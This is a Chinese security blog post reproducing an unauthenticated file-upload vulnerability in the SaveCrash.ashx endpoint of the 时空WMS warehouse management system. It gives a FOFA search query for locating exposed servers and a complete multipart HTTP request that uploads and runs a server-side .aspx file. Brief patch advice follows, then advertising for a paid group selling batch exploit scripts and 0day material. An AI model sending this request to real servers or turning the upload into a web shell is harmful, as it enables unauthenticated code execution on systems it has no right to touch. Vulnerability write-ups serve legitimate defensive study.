#  「漏洞复现」时空WMS-仓储精细化管理系统 SaveCrash.ashx 文件上传漏洞   
冷漠安全  冷漠安全   2024-12-27 04:59  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/rPMtsalfZ0pFeDPJNnYaE7pYibBLQrUbLZwqelcotCqhYf0seBKfHroSUm8XuHyka5I3SmicWcJYUpZbFmxJCZ1Q/640?wx_fmt=gif&from=appmsg "")  
  
0x01 免责声明  
  
请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任。工具来自网络，安全性自测，如有侵权请联系删除。本次测试仅供学习使用，如若非法他用，与平台和本文作者无关，需自行负责！！！  
  
0x02  
  
产品介绍  
  
时空WMS-仓储精细化管理系统是一款高效、智能的仓储管理工具，旨在帮助企业实现仓库的精细化管理和高效运营。由郑州时空软件开发，专注于以数字化、智能化推动企业进步。该系统基于先进的仓储管理理念和技术架构，融合了物联网、移动互联等前沿技术，实现了对仓库内物资的全面、精准、高效管理。系统适用于各类仓储物流企业，包括电商仓储、第三方物流、生产仓储等多个领域。通过使用该系统，企业可以实现对仓库内物资的全面掌控和高效管理，提高库存周转率，降低库存成本，提升企业竞争优势。  
  
0x03  
  
漏洞威胁  
  
时空WMS-仓储精细化管理系统 SaveCrash.ashx 接口存在文件上传漏洞，未经身份验证的攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。  
  
0x04  
  
漏洞环境  
  
FOFA:  
   
```
body="SKControlKLForJson.ashx"
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0pREc0vT1H33SBbkv0otXN0hsra1lQEJibwF1DzTVDj0dwShWMw06Dvzcs2ID40UkEavhb3Spicwq0A/640?wx_fmt=png&from=appmsg "")  
  
  
0x05  
  
漏洞复现  
  
PoC  
```
POST /crash/SaveCrash.ashx HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36(KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Content-Type: multipart/form-data;boundary=----WebKitFormBoundaryssh7UfnPpGU7BXfK
Upgrade-Insecure-Requests: 1
Accept-Encoding: gzip

------WebKitFormBoundaryssh7UfnPpGU7BXfK
Content-Disposition: form-data; name="file"; filename="{{username}}.aspx"
Content-Type: text/plain

<%@Page Language="C#"%><%Response.Write("hello,world!!!");System.IO.File.Delete(Request.PhysicalPath);%>
------WebKitFormBoundaryssh7UfnPpGU7BXfK--
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0pREc0vT1H33SBbkv0otXN0UWC3MRaQ9O5nOWTEcTsXDyTyU3q0A04DgKxnpnf3FjaibT6T7q3vWhA/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0pREc0vT1H33SBbkv0otXN0odNicfHzVzkt7hStPicxedNUCzFOWOKUbgsON69xkPyZyIhzgd4QNQmg/640?wx_fmt=png&from=appmsg "")  
  
0x06  
  
批量脚本验证  
  
Nuclei验证脚本已发布  
  
知识星球：冷漠安全  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0pREc0vT1H33SBbkv0otXN0SfvxGV3eSMHAasj1oqTowDcU3gIwhZUN09NNib63T3mTRpjLZZniay6g/640?wx_fmt=png&from=appmsg "")  
  
  
0x07  
  
修复建议  
  
关闭互联网暴露面，文件上传接口处设置权限控制，添加黑白名单过滤  
  
打补丁或升级至安全版本  
  
0x08  
  
加入我们  
  
漏洞详情及批量检测POC工具请前往知识星球获取  
  
知识星球：冷漠安全  
  
交个朋友，限时优惠券：加入立减25  
  
星球福利：每天更新最新漏洞POC、资料文献、内部工具等  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0pREc0vT1H33SBbkv0otXN0sf9hQibqPeUC8gZBqWv8NTTynS6h30WIyrJXkhYFs5BHGOkKxxJcAFg/640?wx_fmt=png&from=appmsg "")  
  
  
「星球介绍」：  
  
本星球不割韭菜，不发烂大街东西。欢迎进来白嫖，不满意三天退款。  
  
本星球坚持每天分享一些攻防知识，包括攻防技术、网络安全漏洞预警脚本、网络安全渗透测试工具、解决方案、安全运营、安全体系、安全培训和安全标准等文库。  
  
本星主已加入几十余个付费星球，定期汇聚高质量资料及工具进行星球分享。  
  
  
「星球服务」：  
  
  
加入星球，你会获得：  
  
  
♦ 批量验证漏洞POC脚本  
  
  
♦ 0day、1day分享  
  
  
♦ 汇集其它付费星球资源分享  
  
  
♦ 大量的红蓝对抗实战资源  
  
  
♦ 优秀的内部红蓝工具及插件  
  
  
♦ 综合类别优秀Wiki文库及漏洞库  
  
  
♦ 提问及技术交流  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/rPMtsalfZ0pREc0vT1H33SBbkv0otXN0K1wT5tzg9euNpXiaRJjhdnqpdK9xOX4C63oCyrZlQsmoXYIvibnYLT9g/640?wx_fmt=gif&from=appmsg "")  
  
  
